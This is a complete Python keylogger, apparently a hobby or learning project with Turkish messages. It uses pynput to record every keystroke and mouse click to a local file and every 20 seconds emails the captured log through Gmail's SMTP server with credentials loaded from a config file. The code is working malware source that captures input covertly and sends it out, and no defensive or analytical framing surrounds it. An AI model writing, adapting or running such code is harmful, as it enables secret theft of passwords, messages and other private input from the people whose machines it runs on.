import os
import smtplib
import datetime
import threading
from pynput import keyboard, mouse

import configparser

config = configparser.ConfigParser()
config.read('config.ini')

EMAIL_ADDRESS = config.get('Email', 'EMAIL_ADDRESS')
EMAIL_PASSWORD = config.get('Email', 'EMAIL_PASSWORD')
SEND_REPORT_EVERY = 20 # as in seconds



class MyLog:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = ""
        self.email = email
        self.password = password
        self.subject = "Report"
        self.file = "log.txt"
        self.idx=0
        self.timer=None


    def on_press(self, key):
        self.log += (f'Key {key} pressed\n')
        if key == keyboard.Key.esc:
            print("esc")
            if self.timer is not None:
                self.timer.cancel()
                try:
                    os.remove(self.file)
                    print(f"{self.file} dosyası silindi.")
                except OSError as e:
                    print(f"Hata: {e}")
                os._exit(0)

        elif key == keyboard.Key.enter:
            with open(self.file, "a") as file:
                file.write(self.log + "Girilme Tarihi = " + str(datetime.datetime.now()) + "\n")
            self.log = ""


    def on_click(self, x, y, button, pressed):
        if pressed:
            self.log += (f'Mouse clicked at ({x}, {y}) with {button}\n')
        else:
            self.log += (f'Mouse released at ({x}, {y}) with {button}\n')



    def handler(self):
        with keyboard.Listener(on_press=self.on_press) as k_listener:
            with mouse.Listener(on_click=self.on_click) as m_listener:
                m_listener.join()
                k_listener.join()


    def contains_other_data(self, input_str):
        return bool(input_str.strip()) and not all(char.isspace() for char in input_str)

    def report(self):
        with open(self.file) as file:
            data = file.read()
        print("1")
        print(data)

        if data is not None and self.contains_other_data(data):
            print("email send:")
            print(data)
            self.send_email(data)
            open(self.file,"w")


        self.timer = threading.Timer(self.interval, self.report)
        self.timer.start()




    def send_email(self, body):
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            #server.set_debuglevel(1)
            server.ehlo()
            server.starttls()
            server.login(self.email, self.password)

            message = f"Subject: {self.subject}\n\n{body}"
            server.sendmail(self.email, self.email, message.encode("utf-8"))
            server.close()

    def start(self):
        self.send_email("Key Logger started")

    def run(self):
        self.report()



if __name__ == "__main__":
    keylogger = MyLog(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)

    keylogger.start()
    open(keylogger.file,"w")
    keylogger.run()
    keylogger.handler()


